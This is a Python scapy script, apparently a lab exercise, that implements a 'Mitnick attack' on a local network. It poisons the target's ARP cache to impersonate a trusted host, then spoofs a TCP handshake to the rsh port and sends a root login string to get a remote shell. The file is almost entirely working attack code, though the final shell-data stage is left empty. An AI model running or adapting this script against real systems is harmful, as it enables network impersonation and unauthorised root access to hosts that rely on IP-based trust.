"""Mitnick Attack in LAN."""
import argparse
import os
import random
import sys

import scapy.all as sc
from scapy.layers import l2

RSH_PORT = 513


def get_mac_from_ip(interface: str, ip: str) -> str:
    """Get the MAC address of the machine with the specified 'ip'."""
    # Ping machine
    ping_res = os.system(f'ping -c 1 {ip} > /dev/null 2>&1')

    if ping_res != 0:
        return ''

    # Get machine's IP using the ARP table
    with os.popen(f'arp -n | grep {interface} | grep {ip} | tr -s " "'
                  ' | cut -d " "'
                  ' -f 3') as f:
        mac_addr = f.read().strip()

    return mac_addr


def get_ifname_and_mac_by_iprange(target_ip: str) -> tuple:
    """Get the MAC address from the interface matching the target IP."""
    ip_prefix = '.'.join(target_ip.split('.')[:2])

    with os.popen(f'ip r | grep "{ip_prefix}" | cut -d " " -f 3') as f:
        ifname = f.read().strip()

    if not ifname:
        return ()

    with os.popen(f'ip a show {ifname} | grep "link/ether" | tr -s " " |'
                  'cut -d " " -f 3') as f:
        mac_addr = f.read().strip()

    if not mac_addr:
        return ()

    return ifname, mac_addr


def arpspoof(mac_addr: str, target_ip: str, target_mac: str,
             trusted_ip: str) -> None:
    """Run the ARP Spoofing."""
    a = l2.ARP()
    a.op = 'is-at'

    # Target
    a.pdst = target_ip
    a.hwdst = target_mac

    # Trusted IP
    a.psrc = trusted_ip

    # Own MAC address
    a.hwsrc = mac_addr

    a.show()
    sc.send(a)

    return


def rsh_attack(target_ip: str, trusted_ip: str) -> None:
    """Run the Remote Shell attack."""
    sport = 1023

    # Base IP packet with spoofed source IP
    ip_packet = sc.IP(src=trusted_ip, dst=target_ip)

    # --- THREE-WAY HANDSHAKE
    syn_packet = sc.TCP(sport=sport, dport=RSH_PORT, flags='S', seq=1000)
    synack = sc.sr1(ip_packet / syn_packet)

    ack_packet = sc.TCP(sport=sport,
                        dport=RSH_PORT,
                        flags='A',
                        ack=synack.seq + 1,
                        seq=synack.ack)
    sc.send(ip_packet / ack_packet)

    # --- REMOTE SHELL INIT
    data = "\000root\000root\000xterm/38400\000".encode()
    tcp_packet = sc.TCP(sport=sport,
                        dport=RSH_PORT,
                        flags='PA',
                        ack=synack.seq + 1,
                        seq=synack.ack)
    res = sc.sr1(ip_packet / tcp_packet / data)

    # --- REMOTE SHELL DATA

    return


def main(target_ip: str, trusted_ip: str) -> None:
    """Run the Mitnick Attack."""
    print(f'Target IP: {target_ip}')
    print(f'Trusted IP: {trusted_ip}')

    res = get_ifname_and_mac_by_iprange(target_ip)

    if len(res) == 0:
        print('Error: could not get ifname & MAC address using the target IP')
        sys.exit(1)

    interface, mac_addr = res

    print(f'Interface identified: {interface}')
    print(f'MAC Address: {mac_addr}')

    target_mac = get_mac_from_ip(interface, target_ip)

    if target_mac == '':
        print('Error: could not get target MAC address')
        sys.exit(1)

    print(f'Target MAC Address: {target_mac}')

    print('\nCalling ARP Spoof...')
    arpspoof(mac_addr, target_ip, target_mac, trusted_ip)
    print('Done')

    print('\nSending SYN/RST to capture ISN')
    rsh_attack(target_ip, trusted_ip)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='ARP Spoofing')

    parser.add_argument('--target_ip',
                        type=str,
                        required=True,
                        help='Target IP')

    parser.add_argument('--trusted_ip',
                        type=str,
                        required=True,
                        help='Trusted IP')

    args = parser.parse_args()

    main(args.target_ip, args.trusted_ip)
